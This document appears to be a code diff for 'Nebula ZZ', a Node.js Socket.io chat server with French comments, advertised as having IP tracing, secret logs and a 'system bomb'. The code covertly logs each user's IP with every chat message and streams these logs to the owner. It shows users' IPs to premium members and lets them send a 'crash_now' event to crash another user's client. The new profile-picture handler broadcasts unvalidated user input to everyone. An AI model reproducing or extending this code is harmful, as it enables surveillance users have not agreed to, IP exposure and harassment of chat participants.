@@ -1,7 +1,7 @@
 /**
- * NEBULA ZZ - SUPREME SERVER CORE V35
+ * NEBULA ZZ - SUPREME SERVER CORE V35.5
  * PROPRIÉTÉ EXCLUSIVE DE : toucheur2pp
- * CAPACITÉS : IP TRACING, SYSTEM BOMB, GLOBAL BG SYNC, SECRET LOGS
+ * CAPACITÉS : IP TRACING, SYSTEM BOMB, GLOBAL BG SYNC, SECRET LOGS, PROFILE EDIT
  */
 
 const express = require('express');
@@ -25,7 +25,7 @@ const nebula_registry = {
     config: {
         globalBG: "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJpZzR4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/l0HlMG1W8f2U08I5G/giphy.gif",
         masterName: "toucheur2pp",
-        version: "35.0.0-PRO"
+        version: "35.5.0-ULTRA"
     },
     logs: [] // Stockage des messages pour le Chef
 };
@@ -34,7 +34,7 @@ app.use(express.static(__dirname));
 
 // --- LOGIQUE SOCKET INTERSTELLAIRE ---
 io.on('connection', (socket) => {
-    // Extraction de l'IP réelle (même derrière un proxy)
+    // Extraction de l'IP réelle
     const rawIp = socket.handshake.headers['x-forwarded-for'] || socket.conn.remoteAddress;
     const cleanIp = rawIp.includes('::') ? "127.0.0.1" : rawIp.split(',')[0].trim();
 
@@ -54,16 +54,22 @@ io.on('connection', (socket) => {
             connectedAt: new Date()
         };
 
-        // Si c'est toi, on t'envoie les logs secrets immédiatement
-        if (isMaster) {
-            socket.emit('secret_logs_sync', nebula_registry.logs);
-        }
+        if (isMaster) socket.emit('secret_logs_sync', nebula_registry.logs);
 
         socket.emit('update_bg', nebula_registry.config.globalBG);
         syncAll();
     });
 
-    // 2. SYSTÈME DE CHAT & LOGS DIVINS
+    // 2. CHANGER LA PHOTO DE PROFIL (NOUVEAU)
+    socket.on('update_profile', (data) => {
+        if (nebula_registry.users[socket.id]) {
+            nebula_registry.users[socket.id].pp = data.pp;
+            console.log(`[!] Profil mis à jour : ${nebula_registry.users[socket.id].name}`);
+            syncAll(); // Synchronisation immédiate de la nouvelle image pour tous
+        }
+    });
+
+    // 3. SYSTÈME DE CHAT & LOGS DIVINS
     socket.on('chat_msg', (msg) => {
         const sender = nebula_registry.users[socket.id];
         if (!sender) return;
@@ -76,21 +82,16 @@ io.on('connection', (socket) => {
             time: new Date().toLocaleTimeString()
         };
 
-        // Sauvegarde dans les logs pour le Chef
         nebula_registry.logs.push({ ...payload, ip: sender.ip });
         if (nebula_registry.logs.length > 500) nebula_registry.logs.shift();
 
-        // Broadcast à tout le monde
         io.emit('chat_msg', payload);
 
-        // Envoi en temps réel aux logs du Chef
         const masterSid = Object.keys(nebula_registry.users).find(id => nebula_registry.users[id].chef);
-        if (masterSid) {
-            io.to(masterSid).emit('secret_logs_update', payload);
-        }
+        if (masterSid) io.to(masterSid).emit('secret_logs_update', payload);
     });
 
-    // 3. POUVOIR DE TOUCHEUR2PP : CHANGER LE FOND MONDIAL
+    // 4. POUVOIR DE TOUCHEUR2PP : CHANGER LE FOND MONDIAL
     socket.on('master_bg_change', (newUrl) => {
         if (nebula_registry.users[socket.id]?.chef) {
             nebula_registry.config.globalBG = newUrl;
@@ -99,34 +100,29 @@ io.on('connection', (socket) => {
         }
     });
 
-    // 4. POUVOIR DE PROMOTION (RANK UP)
+    // 5. POUVOIR DE PROMOTION
     socket.on('admin_promote', (targetSid) => {
-        if (nebula_registry.users[socket.id]?.chef) {
-            if (nebula_registry.users[targetSid]) {
-                nebula_registry.users[targetSid].premium = true;
-                io.to(targetSid).emit('rank_up');
-                syncAll();
-            }
+        if (nebula_registry.users[socket.id]?.chef && nebula_registry.users[targetSid]) {
+            nebula_registry.users[targetSid].premium = true;
+            io.to(targetSid).emit('rank_up');
+            syncAll();
         }
     });
 
-    // 5. NEBULA BOMB (CRASH SYSTÈME)
+    // 6. NEBULA BOMB
     socket.on('nebula_bomb', (targetSid) => {
         const attacker = nebula_registry.users[socket.id];
         const target = nebula_registry.users[targetSid];
 
         if (attacker?.premium && target) {
-            // Un Premium ne peut pas bomb le Chef
-            if (target.chef) {
-                return socket.emit('chat_msg', { name: "SYSTÈME", text: "⚠️ ERREUR : Impossible d'attaquer le Créateur." });
-            }
+            if (target.chef) return socket.emit('chat_msg', { name: "SYSTÈME", text: "⚠️ ERREUR : Le Créateur est immunisé." });
             
             console.log(`[!] ATTENTION : ${attacker.name} a bomb ${target.name}`);
             io.to(targetSid).emit('crash_now', attacker.name);
         }
     });
 
-    // 6. GESTION DES SALONS VOCAUX
+    // 7. GESTION DES SALONS VOCAUX
     socket.on('create_room', (roomName) => {
         if (nebula_registry.users[socket.id]?.premium) {
             const roomId = roomName.toUpperCase().replace(/\s+/g, '-');
@@ -139,7 +135,7 @@ io.on('connection', (socket) => {
         }
     });
 
-    // 7. DÉCONNEXION
+    // 8. DÉCONNEXION
     socket.on('disconnect', () => {
         if (nebula_registry.users[socket.id]) {
             console.log(`[-] Départ : ${nebula_registry.users[socket.id].name}`);
@@ -148,12 +144,8 @@ io.on('connection', (socket) => {
         }
     });
 
-    // --- FONCTIONS INTERNES ---
     function syncAll() {
-        // On envoie la liste des utilisateurs
-        // Les Premium voient les IP, les normaux voient "MASQUÉ"
         const userList = Object.values(nebula_registry.users);
-        
         Object.keys(nebula_registry.users).forEach(sid => {
             const viewer = nebula_registry.users[sid];
             const filteredList = userList.map(u => ({
@@ -166,16 +158,13 @@ io.on('connection', (socket) => {
             }));
             io.to(sid).emit('sync_users', filteredList);
         });
-
         io.emit('sync_rooms', Object.values(nebula_registry.rooms));
     }
 });
 
-// --- DÉMARRAGE DU MOTEUR ---
 http.listen(PORT, () => {
     console.log(`
     ____________________________________________________
-    
        NEBULA ZZ PREMIUM SERVER - ONLINE
        Version: ${nebula_registry.config.version}
        Master: ${nebula_registry.config.masterName}
